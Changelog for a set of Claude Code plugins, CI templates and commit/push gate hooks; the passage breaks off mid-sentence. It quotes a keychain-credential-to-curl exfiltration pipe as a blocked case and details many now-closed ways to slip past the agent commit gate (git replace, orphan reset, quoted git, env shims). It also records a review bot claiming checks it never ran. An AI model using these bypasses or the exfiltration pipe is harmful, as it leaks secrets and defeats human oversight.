# Changelog

All notable changes to this project will be documented here. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project
adheres to [Semantic Versioning](https://semver.org/).

> **Copy edit, 2026-07-25 (issue #56).** Entries below this line were edited
> after publication to remove em dashes, bringing historical copy under the
> house redaction rule (`skills/writing/redaction.md` §14) so the tree-wide
> sweep reaches zero and its output stays meaningful. **Punctuation only:** no
> claim, version, date, count, attribution or issue reference was altered. This
> notice exists because a changelog whose past entries are groomed silently is
> no longer evidence of what was said at the time; the record should be honest
> about having been edited. The pre-edit text is in git history.

> **Copy edit, 2026-09-08 (action-side redaction gate).** Sixteen list items
> below opened with a bold label followed by a colon. The bold was removed so
> the tree passes the new BOLD_LABEL detector (`skills/writing/redaction.md`
> §15/§16). Wording, claims, counts, dates and references are unchanged.

## [Unreleased]

### Fixed

- The native profile merges a head only when Codex and Claude both conclude for it, and lifts the review hold itself (owner rule, 2026-10-29: "until the review of codex and claude (done autonomously) are there, it cannot merge, the hold should be removed after reviewers agree on merging"). The review reader also reads the latest `claude-review-verdict:v1` marker of the Claude App for the head (#221), from the same editor-authenticated GraphQL comments as the Codex summary: a missing marker keeps the gate pending as `claude_verdict_missing`, `merge:false` blocks as `claude_refused`, a marker edited by another account blocks as `claude_verdict_unreadable`, and a missing Codex kind is named `codex_code_verdict_missing` or `codex_security_verdict_missing`. The review job exposes these causes and the `merge` job names them in its summary. `hold` and `autopilot:hold` now mean "reviews incomplete", as in the Cortex convergence planner (Cortex PR 834): the merge job no longer fails on them, and the resolve job, which runs main's authorized definition, deletes them before the protected merge, re-reads the PR and refuses if a hold or a new head appears. `do-not-merge` and a "do not merge" title stay owner holds and are never touched. Completion events and the scheduled reconciliation no longer skip PRs with a review hold, so a Codex receipt or a Claude verdict that completes the reviews reruns the gate (a Claude verdict is picked up by the five-minute reconciliation). Declared as the `reviewer-agreement-lifts-review-holds` adaptation; `ci_codex_review_event_source.py` moves from pristine to adapted assets; `generated/pipeline.yml` is refreshed from the renderer. A Dependabot PR (GraphQL author `dependabot` Bot, branch `dependabot/*`, read from the same node as the comments) has no Claude review by design (#224): an absent marker there reads `not_applicable_dependabot` and counts as agreement, so Codex and the tests decide; an explicit Claude verdict still counts (`dependabot-claude-not-applicable` adaptation, `docs/ci-native-reviews.md`). A failed Codex kind whose latest Codex Bot comment is a usage-limit notice ("reached its/your Codex usage limits", ci-autonome PR 9, spec PR 164, codebase PR 469 on 2026-10-29) keeps the gate pending as `codex_quota_exhausted` instead of blocking as `review_failed` (`codex-quota-wait` adaptation). The agreement rules live in the new authored `scripts/ci_codex_review_agreement.py`, embedded in the review job after the comments module. State table and tests: `tests/test_ci_native_hold_lift.py`.
- The native Codex review reader no longer waits forever on a security review that completed with null verdict flags. A no-issues receipt from Codex for the head commit is the verdict (cortex-viz PR 213 receipt 6491350304, Cortex PR 829, PR 830, spec PR 163, claude-mods PR 51/52); without such a receipt the gate blocks as `codex_security_verdict_missing`, and a security receipt with any other wording blocks as `codex_security_receipt_unrecognized`. The receipt counts only for a completed, current-head, null/null security review with matching completed metadata, from the native Bot with an authenticated editor and a head commit prefix. Explicit verdicts, running reviews and finding-thread resolution are unchanged; the gate never relaunches a review, and resume re-runs the failed review job once the receipt arrives. Declared as the `security-receipt-proof` adaptation; `generated/pipeline.yml` is refreshed from the renderer.

- The `Fix` step of the `review` job in `templates/ci/pipeline.yml` pushes with the Claude App token the action already obtains, so the pipeline runs on the commit it pushes. Its checkout persisted the workflow `GITHUB_TOKEN`. `actions/checkout` v7 links that token through `includeIf.gitdir:*.path`, but `claude-code-action` (8041f1d, `replaceCheckoutCredentials`) clears only `include.path`; it logged "No existing authentication headers to remove" (run 40820034691). So git sent the `GITHUB_TOKEN` header, and PR #171 commit `ae628d6` was pushed as `github-actions[bot]`. GitHub creates `pull_request` runs for a `GITHUB_TOKEN` push in an approval-required state, and an App installation token push runs them without approval (docs.github.com, "Triggering a workflow from a workflow"). Its three runs (40821184278, 40821184389, 40821184277) waited as `action_required` with no job until they were approved by hand. The review checkout now sets `persist-credentials: false`, and the template comment no longer claims that the push re-runs the tests. No secret is added and no permission is widened. `test_the_fix_pushes_with_the_claude_app_token_so_the_pipeline_runs_on_it` fails on the previous template and on its render, and passes on this one.
- `templates/ci/pipeline.yml` pins `anthropics/claude-code-action` v1.0.263 (`8041f1d`), the version Dependabot wrote into the rendered `.github/workflows/pipeline.yml` (#212); without the template bump the unit job failed on `test_this_repository_runs_the_rendered_template`, as for #193.
- The `Review` step of `templates/ci/pipeline.yml` gets the tools its `code-review` skill uses: with only `mcp__github_inline_comment__create_inline_comment` allowed it launched none of the skill's subagents, read no CLAUDE.md and still posted "No issues found. Checked for bugs and CLAUDE.md compliance." (PR #207: 3 turns, 9 s; reproduced locally on #191 in 5 turns, the model writing "I also didn't launch the review subagents"). It now also has its subagents, the `gh` reads of its procedure, Read/Glob/Grep, `gh run view`, `git diff`/`log`/`show` and the test runners, nothing that edits; a repository with `requirements-dev.lock` gets its hashed dev dependencies on PATH first. The prompt names the head SHA, says an earlier Claude comment is no reason to stop, and requires the whole diff, the changed files, the tests and the run's test logs before a verdict; "No issues found" only when every step ran. A failed review now prints its error class (`subtype`, `is_error`, `api_error_status`, `terminal_reason`) from the execution file, not its text: #191 and #192 failed in 434 ms at no cost with no cause in the log (runs 40186210241, 40201492297). Receipt: `docs/verification/review-bot-tools-20261029.md`.
- `templates/ci/pipeline.yml` pins `anthropics/claude-code-action` v1.0.262 (`925afb5`) and `actions/setup-python` v7.1.0 (`6d4fd22`), the versions Dependabot wrote into the rendered `.github/workflows/pipeline.yml` and `pipeline-post-merge.yml` (#193). Dependabot does not scan the template, so its bump left the rendered files different from their render and the unit job failed on `test_this_repository_runs_the_rendered_template` and `test_renderer_generates_three_files_in_empty_consumer_and_keeps_config` (job 121991297176). `.github/dependabot.yml` now says so.
- The `merge` job of `templates/ci/native/pipeline.yml` names the failed condition in its "Verify live PR eligibility" step (not open with its state, draft, head moved with both SHAs, held by title, held by label) instead of one sentence for all four. The step now passes only when jq returns the value `eligible`; the single-sentence form passed on any state that matched its filter. The 43 failed Pipeline runs of 2026-10-27/28 are attributed to their code paths in `docs/verification/native-gate-patience-20261029.md` (#206).
- The native `merge` job refuses an empty `gh pr view` read ("PR state is unreadable") instead of passing it: the diagnostics change of #206 made an empty read fail open, where the single-sentence form failed closed. Corrects #206, whose sources cited Cortex run 40548981339 although its `merge` job never reached the eligibility step; only run 40583904933 does.
- The `merge` job of `templates/ci/pipeline.yml` sets `GH_REPO: ${{ github.repository }}` on its `gh pr merge` step: the job runs without a checkout, so gh could not infer the repository and failed with `fatal: not a git repository` after every stage was green (session-optimizer #65, run 39756969927, 2026-10-22).

### Added

- `tools/ci_contract.py` validates a repository's `ci.json` before any test runs: exactly the keys `unit`, `regression`, `e2e`, `environment`, `install`, each a non-empty shell command, plus an optional `version_file` (default `.claude-plugin/plugin.json`) that must exist; one line per fault, exit 1 (design `docs/superpowers/specs/2026-10-22-single-ci-design.md`, plan `docs/superpowers/plans/2026-10-22-single-ci-plan.md`, task 1.1).
- `tools/ci_coverage.py coverage.xml --min 90` reads the root `line-rate` of a Cobertura report as a percentage (Decimal, two places): exit 1 under the minimum (89.90 fails, 90.00 passes), exit 2 when the report is absent or malformed, never a silent pass (plan task 1.2).
- `templates/ci/pipeline.yml`, the single CI template rendered into every repository as `.github/workflows/pipeline.yml` ("Pipeline"): `contract` (the embedded `tools/ci_contract.py`), `unit` (the embedded `tools/ci_coverage.py`, 90 % of lines), `regression`, `e2e`, `environment` and `install` (ubuntu, macos, windows, `@anthropic-ai/claude-code@2.1.296`, fresh `HOME` and `CLAUDE_CONFIG_DIR`), `review` (the documented `/code-review:code-review --comment` then a fix step with the failed-job URLs; skipped for drafts, forks, Dependabot, a bot-authored head commit or a diff touching the pipeline), `merge` (always runs on a same-repo pull request and fails explicitly when one of the five jobs did not succeed or the review failed, since a skipped required check counts as satisfied, measured on claude-mods #38 and session-optimizer #73; then `gh pr merge --auto --squash`, no checkout) and `tag` on push to main (Cortex's release gate over `RELEASE_TAG_SSH_KEY`, version from `ci.json` `version_file`). Actions pinned by SHA; `tests/test_ci_template.py` keeps the two inline steps byte-identical to the tools and `tools/tests/ci-template/run-tests.sh` runs actionlint (plan task 1.3, design decisions 1, 2, 4, 5, 8).
- `scripts/setup.sh render-ci <target>` (`scripts/lib/render-ci.sh`) writes `<target>/.github/workflows/pipeline.yml` as one header line, `# generated by zetetic-team-subagents render-ci <git hash-object of the template>`, then `templates/ci/pipeline.yml` byte for byte, and `<target>/ci.json` from `templates/ci/ci.example.json` only when the repository has none; a second run changes no byte. `tools/tests/render-ci/run-tests.sh` covers usage, the header, the body, the example, idempotence and a kept `ci.json` (plan task 1.4).
- This repository runs the pipeline it renders: `ci.json` (unit with coverage in a venv from `requirements-dev.lock`, regression `tests/run-all.sh`, e2e the six memory suites, environment `setup.sh install --dry-run` + `plugin-version-check.sh --json`, install from this checkout as a marketplace into a fresh `CLAUDE_CONFIG_DIR`) and `.github/workflows/pipeline.yml` rendered by `render-ci` (a test keeps it equal to header + template). `.github/workflows/claude-review.yml` removed: beside the pipeline it was a second merger. `fail_under` 90 (red at the measured 80 % until coverage is there). Design doc: mutation testing is scoped to the PR's changed files, never a whole-tree pass (plan task 1.5).

### Security

- `hooks/pre-tool-secret-shield.py` allows one whole command the owner authorized on 2026-10-29, `security find-generic-password -s "Claude Code-credentials" -w` (reading the Claude Code keychain entry to provision the OAuth token), matched word for word after quote removal (`AUTHORIZED_COMMANDS`). Any other command that contains it is judged by the existing rules and stays blocked: piped to `curl`, redirected, chained, inside `$(...)`, after an assignment, split by a line break, without `-w`, with `-g`, or for another service. The exception first lived as an uncommitted `cmd.replace(...)` that removed the substring from any command, which let `... -w | curl -d @- <url>` and `... -w > /tmp/token` through (6 of the new cases fail against it). `plugins/zetetic-gates` carries the same file (`scripts/sync-gates.py`).
- The Claude Code workflows follow the documented setup (https://code.claude.com/docs/en/github-actions, "Run a skill" and "Respond to @claude mentions"; actions pinned by SHA). `.github/workflows/claude-review.yml`, on `pull_request` only, installs the `code-review@claude-code-plugins` plugin and runs its skill with `--comment` (`/code-review:code-review --comment <repo>/pull/<n>`), with read-only `contents`, `pull-requests` and `issues` permissions and `allowed_bots: "dependabot[bot]"` (the action refused Dependabot PRs as a non-human actor); it no longer applies findings or arms auto-merge. `.github/workflows/claude.yml` keeps only the `@claude` job. Neither checks out the PR head ref, which clears CodeQL `actions/untrusted-checkout/high`, `actions/untrusted-checkout-toctou/high` and `actions/untrusted-checkout/medium`.

### Changed

- `.github/workflows/claude.yml`: the @claude mention workflow can run ruff, uv, pipx, coverage, tsc, shellcheck and the Claude CLI.
- Every delegation applies a genius pattern (owner decision 2026-10-21). `rules/agent-routes.json` maps 23 task classes to a built-in `subagent_type` (`general-purpose`, `Explore`, `Plan`) plus 1 or 2 genius agents, and `scripts/generate-routing-table.py` renders it in `rules/agent-routing-table.md`. The 34 skills that named team agents now name genius patterns in `agents:`; `tools/skill-runner.sh` tells the caller to delegate to a built-in agent at the genius tier with a `GENIUS:` line instead of spawning an agent. `scripts/spawn-agent.sh`, `tools/agent-catalog.sh`, `scripts/setup.sh`, the model-override template, the autonomous build loop workflow, the cycle review evidence (`tools/cycle_evidence.py`) and the agent-based doc counts (`97` agents, no team count) follow.
- `/zetetic:engineering-loop` states that every modification is governed by the genius pattern named for the task, applied while the code is written from the published method it carries. The review is Claude Code's native `/code-review` plus `/security-review`, one run each, one cycle.
- `hooks/stop-context-guard.py` writes the checkpoint itself (`tools/checkpoint_summary.py`): last user requests, files edited, commands run, tool errors, last assistant message, open TODOs and repository state, measured from the transcript. It no longer blocks the turn or asks the model to spawn a subagent.

- The commit and push gate is an async task keyed by the tree hash, and its hooks now live in this repository (#169). `gate-proof.py`, `stop-gate-ledger.py` and a new PostToolUse `gate-start.py` replace the copies in `~/.claude/hooks` (registered through `hooks/hooks.json` and `.claude-plugin/plugin.json`; shared code in `hooks/lib/gate_*.py`). A commit no longer waits for a full-suite `scripts/gate.sh commit` (measured medians 130 s here, 345 s Cortex, 2040 s ai-architect-mcp-codebase): `git add` starts the task `gate-commit-<staged tree>-<rules>-<runner>` (`tools/lib/tasks.py`, dedup by key), and the commit hook only reads its record: done and green allows, failed denies with the output path and its tail, running denies with `verification running for tree <hash>; retry the commit when it finishes (status: tools/task.sh status <id>)`. A green record is the cached proof for its key: kind (`commit` or `push`) + tree + a digest of the effective rules + a digest of the runner, so a verdict is never reused for another kind, under other rules or under another runner, and a push needs a green record of kind `push`. The hook never waits and decides on no elapsed time; a worker that died without a result is requeued once, counted, by the next commit attempt. The 8 s kills of the old hooks are gone: the hooks make a handful of local calls (`rev-parse`, `write-tree`) that read refs and the index, never the network or the working tree, and a test fails if a hook module bounds a call by time. The Stop ledger's `status --porcelain` is replaced by a comparison of the staged tree and HEAD, and of HEAD and its upstream.

- What the gate runs is explicit and affected-only, in a private checkout of the tree being verified (`hooks/lib/gate_run.py`), so editing the working tree while a verification runs cannot change its verdict (the old gate got that by refusing unstaged edits). A repository declares its checks in `.zetetic/gate.json` (checks selected by the changed paths, tests selected by a map, a `same_name` rule and a `fast` fallback, a full run when the config itself changes); without it, an executable `scripts/gate.sh` still judges (legacy), else the stack's whole suite, as the old generated script did. `scripts/gate.sh` is no longer generated by a hook. The full suite runs in CI. Format, selection rule and the settings entries to remove after installing: `docs/gate.md`. This repository's own config is `.zetetic/gate.json`.

- The commit gate cannot be argued with by the change it judges, nor by the repository it runs in (#169, review round 2). The rules come from HEAD's tree, never from the working copy: a staged `.zetetic/gate.json` with `checks: [true]` or `off: true` no longer approves itself, and a config change is judged by the union of HEAD's rules and the staged rules, each planned and run with its own environment. A push is judged by the tip tree of every ref it publishes (`git push origin feat`, `feat:main`, `--all`, `--mirror`, a glob, the configured refspecs, `gh pr create --head`, the current branch); a ref that does not resolve to a commit is denied with the reason. Records are keyed by kind, so a push-only gate (`scripts/gate.sh push` adding `test bench oracle`) is no longer satisfied by a green commit record. Affected-only selection is valid only when the base tree has a green record of the same kind under the same rules; otherwise the full configured gate runs. The worker runs commands declared by a repository only if the repository is listed in `~/.claude/zetetic/gate-trusted-repos` (an unlisted repository is denied, with the exact line to add; the hooks never write the file). `hooks/run-python.sh` fails closed for `gate-proof.py` when no Python 3 is found, and the hook is registered with `onFailure: block` so a hook that is killed or cannot finish refuses the call instead of letting it through (Claude Code 2.1.301 hook schema; `docs/gate.md`). The Stop hook again blocks on any open gate failure while tracked changes remain uncommitted or HEAD is ahead of its upstream, including a failed tree that was unstaged with its edits left in the working copy; failures are lifted by line order in an append-only ledger, never by a clock. `README.md`, `CONTRIBUTING.md` and `marketplace.json` state the real hook counts, and the affected-only map selects `doc-count-check` for changes to hooks, `hooks.json`, `plugin.json`, docs and the other sources of a documented count.

- The commit gate's rules can no longer be switched off in two commits, and a push can no longer smuggle an unjudged commit (#169, review round 3). **Rules may only grow without the owner:** a commit whose rules are not a superset of HEAD's (deleting `.zetetic/gate.json`, `"off": true`, removing or replacing a check, narrowing its `paths`, dropping or changing `tests`, `full_on` entries or `env`; for a legacy `scripts/gate.sh` with no config: deleting it, making it non-executable, replacing it) is denied before anything runs, naming each weakened rule and the exact line `<absolute repository path> <hash of the new rules state>` to add to `~/.claude/zetetic/gate-rule-changes`; the hooks never write that file. Before this, commit A deleted the config and passed because HEAD's old checks still passed, and commit B was then judged by a HEAD with no rules. **Tag to branch:** `git push origin refs/tags/t:refs/heads/main` and `refs/tags/*:refs/heads/*` resolve the source whatever the destination is; `--tags`, `--follow-tags` (or `push.followTags=true`), `refs/tags/t` and `tag t` need a green push record for each tagged commit the remote does not already have, and the denial names the tags. **Option clusters are parsed like git:** `-odebug` and `-on` are `-o` with a value, not the flags `d` and `n` (a valued option takes the rest of the cluster), long options may be abbreviated and negated, and `--recurse-submodules check` takes its value; the table of valued options is compared with `git push -h` by a test. **`run-python.sh` without Python** refuses by a shell `case` on the payload (no `grep` needed) and matches `git`/`gh` as a command word, so `highlights` and a working directory under `github` no longer refuse. **HOME as a dotfiles repository** is trustable: only the trusted-repos and rule-change files themselves are exempt from the in-repository override rule, and only while `$HOME` is the account's home. `docs/gate.md` defines superset precisely and lists the known limits (wrapped commands, `GIT_INDEX_FILE`/`--git-dir`, merge/cherry-pick/rebase commits, what a check runs, the Stop ledger lifting failures of other trees by a later green of the same verb).

- The gate reads the objects that are really there (#169, review round 4). Its rules and the trees it checks are read through git objects, and one ungated `git replace` of the blob of HEAD's `.zetetic/gate.json` by `{"off": true}` made the rules read as off, so a failing commit was allowed and pushed. Every git process the gate starts, the worker's included, now goes through one runner (`hooks/lib/gate_git.run`) that sets `GIT_NO_REPLACE_OBJECTS=1` and `GIT_GRAFT_FILE` to the null device and removes `GIT_REPLACE_REF_BASE`, so a replace ref in any namespace, a grafts file and a graft file named in the environment change nothing (`tests/test_gate_git_objects.py`). docs/gate.md now states the cost of a push that publishes tags: a number of git calls proportional to the tags, with no timer and no cap.

- The rule floor no longer moves with HEAD (#169, review round 4). Round 3 floored a commit on HEAD's rules, and HEAD moves under commands the gate does not judge: after `git checkout --orphan` or `git reset --soft` to a commit before the gate, dropping `.zetetic/gate.json` weakened nothing, the next failing commit was ungated, and `git push -f origin nogate:main` published it. A commit or a push is now refused when the rules it leaves in force are weaker than any of its anchors, unless the owner's acknowledgement file holds the line for that end state: HEAD's rules (a commit), the floor the user keeps for the repository in `~/.claude/zetetic/gate-rule-floor/` (`hooks/lib/gate_floor.py`, one append-only file per main checkout, never inside a repository), and for a push the rules of each destination's remote-tracking ref as of the last fetch. An allowed call records what it leaves in force (`raise`, or `set` when an acknowledged state lowers the floor); a denied call records HEAD's rules, which are in force whatever the verdict, so the first judged commit attempt seeds the floor (this goes further than recording only allowed calls, on purpose). A floor that cannot be read or parsed refuses every commit and push of the repository, an override directory never hides the default one, and a crash of the hook refuses where only the floor holds. A repository whose rules no judged call saw in force starts with no floor: docs/gate.md (Rule changes) says what that leaves open. Tests: `tests/test_gate_floor_user.py`, `tests/test_gate_floor_record.py`.

- Without Python, the commit gate again refuses a quoted or escaped `git` (#169, review round 4). Round 3's shell `case` matched the payload as serialised, so `"git" push`, `'git' commit`, `\git push`, `git"" push` and `/usr/bin/"git" push` passed while the Python hook reads each as git (round 2 refused them). `hooks/run-python.sh` now dequotes the payload by parameter expansion before the `case` (the JSON escapes `\n`, `\r`, `\t` become spaces, then every backslash and quote is removed) and matches `git`/`gh` after the JSON key's colon, a space, a separator or a path slash; `github`, `highlights`, `ls` and a working directory containing git or gh still pass. Still builtins only, no `grep` and no `sed`. `tests/test_gate_failclosed.py` runs every command of the reviewer's list both ways against both copies of the script (`hooks/` and `plugins/zetetic-gates/`), with a PATH holding no tool, `cat`, and `cat` and `grep`.

- A gate verdict is a function of the tree, the rules and a named runner, and this repository's own gate can pass (#169, review round 5). **The runner** (`hooks/lib/gate_runner.py`) is a component of the key: the checks get an allowlist of the hook's variables plus the rules' `env`, so `PYTEST_ADDOPTS=--collect-only` in the session no longer turns a failing suite green and `CLAUDE_PLUGIN_ROOT` (exported by Claude Code to plugin hooks) no longer fails three of this repository's tests in the gate; `PATH` loses its entries inside the repository; `{python}` is the interpreter running the gate, never the repository's `.venv` (an untracked shim there made a failing tree green and the green record outlived the shim), identified by its path, version and installed distributions, and refused when it would import from the repository. A failure under one interpreter is no longer the cached verdict under another. The task records its runner (the interpreter is its argv[0], the checks' environment its `--env`), and a failure prints `gate_task.py requeue --id`, which relaunches that recorded command, so a retry from the agent's shell is the hook's verification. `link` is refused: the npm stack default no longer links the working copy's `node_modules` (a shim there decided the verdict) and installs from the tree's `package-lock.json` instead. **The private checkout** is each worker's own `mkdtemp` directory, removed by that worker only: two verifications of one tree under two keys deleted each other's checkout, and both passed a failing tree. **A ratchet check** (`"scope": "added"`) judges only the files a change adds, in full mode too, which is CI's craftsmanship policy; this repository's `craftsmanship` check uses it, since the full gate failed on 21 legacy violations in files the change did not touch, and a new CI job, `gate-self-verification`, runs the repository's own gate on HEAD's tree with a hook's environment (`python hooks/lib/gate_task.py verify`) so that this cannot regress. **The command lexer** reads `$(...)`, backticks and `<(...)` wherever they are written, double quotes included: `out="$(git commit ...)"` and `out="$(git push ...)"` reached git unjudged, and a heredoc message holding an inch mark was refused as "commits explicit paths"; a `cd` in a subshell, a substitution or a pipeline element no longer moves what follows.

### Added

- `.github/workflows/claude.yml`: every push to a PR runs a Claude Code review (`/code-review` then `/security-review`, one cycle), applies the findings and arms squash auto-merge; `@claude` in a comment or issue runs Claude on that request. Action pinned by SHA (anthropics/claude-code-action v1.0.256).
- `hooks/pre-agent-genius-gate.py`, a PreToolUse hook on `Agent`/`Task` that denies a call whose prompt has no `GENIUS: <name>[, <name>]` line, names more than two geniuses, names a genius with no `agents/genius/<name>.md`, or uses a removed team-role `subagent_type` or a genius as a `subagent_type`. Enforce is the default (`ZETETIC_AGENT_GATE=observe|off` to change). Tests in `tests/test_agent_genius_gate.py`.

- `rules/public-apis-reference.md`: how an agent uses the community list at https://github.com/public-apis/public-apis to find a free public API, then verifies the chosen API on its official documentation, terms and rate limits, and with one real request, before relying on it; keys stay out of code and commits. The list is a discovery aid, never evidence about an API. The rule states the real `Auth` values, flags the sponsored APILayer table and the MCP-servers table as having different columns, and shows how to read one category without loading the whole README; `rules/agent-reference/research-resources.md` gains a short pointer so agents reach it.

### Removed

- Pull requests run only the Pipeline workflow; the legacy CI, CodeQL, fuzz, identity and scanner workflows are removed; security is reviewed locally with the security-review skill.
- The 23 team-role agents (`advisor`, `architect`, `code-reviewer`, `data-scientist`, `dba`, `devops-engineer`, `engineer`, `experiment-runner`, `frontend-engineer`, `git-historian`, `latex-engineer`, `memory-writer`, `mlops`, `orchestrator`, `paper-writer`, `professor`, `refactorer`, `research-scientist`, `reviewer-academic`, `security-auditor`, `simplifier`, `test-engineer`, `ux-designer`), owner decision 2026-10-21: only the genius reasoning agents are kept (97 agents plus `agents/genius/INDEX.md`). Delegation runs on the Claude Code built-in agents (`general-purpose`, `Explore`, `Plan`), each applying 1 or 2 genius patterns. `latex-engineer`, `memory-writer`, `orchestrator` and `advisor` have no genius equivalent and no route (the checkpoint is now written by the context-guard hook itself, the delegating session routes by shape, and the advisor is the native advisor tool). Also retired: `rules/agent-vs-skill-classification.md` (a study of the 23 agents). The `agents` array of `.claude-plugin/plugin.json` is gone with them.
- The `ZETETIC-REVIEW: APPROVE` / `REQUEST_CHANGES` verdict ritual, the "three violations means rebuild" rule and the "no iteration budget" rule of `/zetetic:engineering-loop`: the review is Claude Code's native `/code-review` plus `/security-review`, one run each, one cycle.
- The `adversarial-verify` pre-verdict workflow (`.claude/workflows/adversarial-verify.js`, with its tests in `tools/tests/adversarial-verify/`) and the code-reviewer CR-4 mandatory gate (rule 12, adversarial verification before any APPROVE) are removed. They triggered REQUEST CHANGES loops over non-defects and multiplied review cost (five agents per review). The code-reviewer's last rule (emit the verdict) is now rule 12. The zetetic spine beat of the same name (write the test that catches the bug) is unchanged.

### Fixed

- The gate's `{top}` is the canonical path of the private checkout (`hooks/lib/gate_run.py`): `tempfile.mkdtemp` returned `/var/folders/...` on macOS while a check run there sees `/private/var/folders/...` through `getcwd()`, so `test "$GATE_TOP" = "$PWD"` failed and `tests/test_gate_run.py::test_an_untracked_directory_never_reaches_the_checks_and_top_is_the_private_checkout` failed locally (CI on Linux has no such symlink).

- The session hooks no longer write `.claude/session-cache.json` inside the user's working repository (#175). `tools/session-store.sh` (called by `hooks/session-end.sh` to save and by `hooks/lib/session-sections.sh` to load) now keeps the cache at `${CLAUDE_CONFIG_DIR:-$HOME/.claude}/session-cache/<first 16 hex of sha256 of the absolute working-tree path>.json`, one file per working tree, same JSON and same `save`/`load` interface. The in-repo file was untracked in any repo that did not gitignore it, and a worktree manager refuses to delete a worktree holding an untracked file, so it blocked every cleanup. There is no fallback read from the old location; existing in-repo cache files are left in place. When neither `sha256sum` nor `shasum` is installed, the key is computed with `python3` `hashlib`, giving the same key. The `.claude/session-cache.json` line is removed from this repo's `.gitignore`. Covered by `scripts/test-session-cache.sh`, which also checks `load` from a subdirectory, a linked worktree, the `sha256sum`-only path, the `shasum`-only path, the no-hash-tool path and a non-git directory reached through a symlink.

- `tests/run-all.sh` no longer needs a python3 that already has pytest (#171). The new `tools/dev-python.sh` picks the interpreter: `PYTHON_BIN` if set, otherwise the worktree's `.venv`, otherwise the main checkout's `.venv`, which it creates when missing by installing `requirements-dev.lock` with `--require-hashes`, the same pins CI installs; `DEV_PYTHON_CREATE=0` turns the creation off and prints the command instead (the default, 1, creates it). `tools/tests/fail-before/run-tests.sh` uses it too. When `dev-python.sh` fails, `tests/run-all.sh` and `tools/tests/fail-before/run-tests.sh` now stop with exit 1 and its diagnostic instead of falling back to a bare `python3`; a new suite, `tools/tests/dev-python/run-tests.sh`, covers `PYTHON_BIN` (good and bad), the `.venv` preference, `DEV_PYTHON_CREATE=0` and that stop. The docs now count 44 suites (README badge, `docs/COUNTING.md`), and `tests/test_fail_before_requirements.py` expects the stop and its diagnostic. Before, a Homebrew python3 without pytest failed 2 of the 41 suites until `PYTHON_BIN` was set by hand. Decision: ADR-9849.

- A cycle task whose worktree was removed after its push no longer blocks every later stop (#172). Its stages can no longer be proven in the transcript once the files are gone, and `cycle_ledger.py` had no way to close it. `cycle_ledger.py close-disposed <task> --url <pull request> --sha <commit>` now closes it, and only when the proof is bound to the task. The task's worktree must be gone: it recorded its repository and first edited file as absolute paths and neither exists. A task without a repository or with a relative first path is never taken as gone. The URL must be, in full, a pull request of the repository's GitHub `origin`. The commit must be reached by a ref of `origin` (the pushed branch, or the default branch once the PR is merged, squash-merge commit included), committed no earlier than the task opened, and must change the file the task first edited, so another session's unrelated push cannot close it. Otherwise it refuses and the ledger is unchanged. The git checks run before the ledger lock is taken; under it, only whether the task is still open is checked. The close records where the task's transcript ended (the subagent's own `agent-<id>.jsonl` for a subagent task), so the next task of that agent does not count the disposed task's stage calls again. The close is counted as `disposed` in `metrics`, never as proven stages. `stop-cycle-gate.py` prints this command for a task exactly when `cycle_ledger.worktree_gone` holds for it.

- The zetetic-gates PreToolUse hook no longer refuses a harmless Bash command because a here-document body holds prose (#174). `mkdir -p x && cat > f <<'EOF'` followed by a body such as `the git hook won't run` was refused with "Cannot inspect shell quoting before git validation": the body mentioned git, so the whole command went to `shlex`, which lexed the body as shell words and failed on the apostrophe. A new `hooks/lib/shell_text.py` first rewrites the command the way the shell reads it (POSIX Shell Command Language §2.7.4): a body whose delimiter is quoted is data and is removed; of an unquoted body only the commands of its `$(...)` and backtick substitutions are kept, because the shell runs those and its quotes and `#` are data (a body such as `# don't git commit` followed by `echo $(date)` is no longer refused, and `won't $(git commit -m x)` now reaches the commit gate instead of being refused); the delimiter is the word after quote removal and line joining (`$'EOF'`, `$"EOF"`, `'E\F'`, `EO\` newline `F`); comments and backslash-newlines are removed and an unquoted newline separates commands. Inside `${...}`, `$[...]` and arithmetic `((...))`/`$((...))` (POSIX §2.6.2, §2.6.4) `<<` and `#` are text, not a here-document operator or a comment, and a `$(...)` there is rewritten like any other: before, `echo ${x//<<} &&` read a here-document that swallowed the `git commit` on the next line, and a `#` copied from such a span hid the command after it. `((` opens arithmetic only when the `)` matching its inner `(` is directly followed by `)` (bash `parse_arith_cmd`); `((echo a) # c` is two subshells, so its comment is removed. A `#` right after `$(...)`, `$((...))`, `<(...)` or a removed backslash-newline is inside a word, not a comment (§2.3 rule 9), so `echo $(echo a)#b; git commit` reaches the commit gate. A `$(...)` reads its own here-documents, and a `case` opened anywhere a word starts (also after `then`, `do`, `!` or `{`) keeps its pattern's `)` from ending the `$(...)` that holds it. `shlex` returns a run of operator characters as one token; `};`, `);`, `;(` and `)&&` are now split into the operators the shell reads, and `;;` separates like `;`, so `{ echo a; }; git commit` and `x;(git commit)` are gated (both escaped on main). A here-document whose delimiter line never comes, or nesting beyond Python's recursion limit, makes the command uninspectable: the operator may have been misread (bash reads `a[1<<2]=x` as a subscript and runs the next line, zsh reads a here-document), so such a command is refused, with the cause in the message, when its text may hold a git commit or push, like a command that still cannot be lexed. The rewrite also closes three ways a real commit escaped the gate: a commit on its own line (`mkdir x` then a newline then `git commit`), a commit after a word holding `#` (`x=a#b; git commit`, which `shlex` read as a comment), and a commit split by a backslash-newline. `scripts/sync-gates.py` ships the new module in the standalone `zetetic-gates` package. The `esac` look-back reads back only to the previous word, so over a whole command it scans at most twice its length (round 6 re-read the whole text after a run of more than 256 blanks). `git_commands` also runs origin/main's flat reading (the raw command lexed by `shlex` as one line) and returns the union of both: wherever that reading succeeds, the gate never finds fewer commit or push targets than origin/main did. A git selector origin/main refused (`GIT_DIR=`, `--git-dir`) is refused the same way. Where the flat reading cannot lex the command (origin/main refused it), the command is refused whenever the word `git` is left in its rewritten text or in any span the rewrite dropped other than a here-document body (a comment, a here-document operator and its delimiter word), whatever targets the rewrite found, or when the rewrite cannot read it: a decoy `git -C <other repo> commit` cannot waive the refusal, and neither can a verb built at run time (`x=git; y=comm; $x ${y}it`, `$(printf com)mit`). origin/main refused exactly the commands that mention `git` followed by a blank and that `shlex` cannot lex, so this refuses nothing origin/main accepted; it spares only commands whose every `git` is here-document body data, such as the motivating `it's` prose. Testing the dropped spans, rather than listing the characters after which zsh reads `#` as part of a word (`<->#x`, `(b|#x)`), keeps a comment misread by either shell from hiding a `git`. There, a command name built at run time (`x=gi; ${x}t commit`, `$(printf gi)t`, a glob or brace expansion, a word after `exec`, `env` or `eval`, or `xargs`) refuses too, though the only `git` is body data. Every return path applies this rule first, including the two 128 KiB size caps. As on origin/main, `cat <<'EOF'`, `don't`, 